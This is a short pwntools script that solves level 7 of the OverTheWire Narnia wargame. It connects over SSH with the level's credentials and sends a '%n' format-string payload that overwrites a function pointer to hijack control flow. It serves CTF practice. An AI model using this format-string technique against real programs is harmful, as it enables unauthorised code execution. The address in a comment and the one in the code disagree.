from pwn import * 
# address of writable pointer to goodfunciton, ptr = 0xffffd558  ==> \x58\xd5\xff\xff
# hackedfunction() = 0x8048724
# The decimal value of 0x8048724 is 134514468
# solution: $(python -c 'print "\x58\xd5\xff\xff%134514468x%n"')
user = 'narnia7'
passwd = 'ahkiaziphu'

s = ssh(host= 'narnia.labs.overthewire.org', user=user, password=passwd, port=2226)

s.set_working_directory('/narnia')

payload = ""
payload += p32(0xffffdc68)
payload += "%134514468x"
payload += "%n"

p = s.process(['./narnia7',payload])
p.interactive()